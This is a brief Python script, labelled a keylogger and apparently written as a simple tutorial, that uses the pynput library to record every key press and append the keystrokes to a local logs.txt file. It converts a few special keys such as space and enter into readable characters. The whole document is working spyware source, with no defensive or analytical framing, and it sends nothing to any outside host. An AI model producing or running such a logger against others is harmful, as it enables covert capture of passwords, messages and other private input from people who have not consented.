#Keylogger
#storing the keystroke in text file

from pynput.keyboard import Listener

def writefile(key):
    letter=str(key)
    letter=letter.replace("'","")
#you can use more if for better syntax but we use 4 if to keep the function simple
    if letter =="Key.space":
        letter=' '
    if letter =="Key.shift_r":
        letter=''
    if letter =="Key.ctrl_l":
        letter=''
    if letter =="Key.enter":
        letter='\n'

    with open("logs.txt","a")as f:
        f.write(letter)

with Listener (on_press=writefile)as l:
    l.join()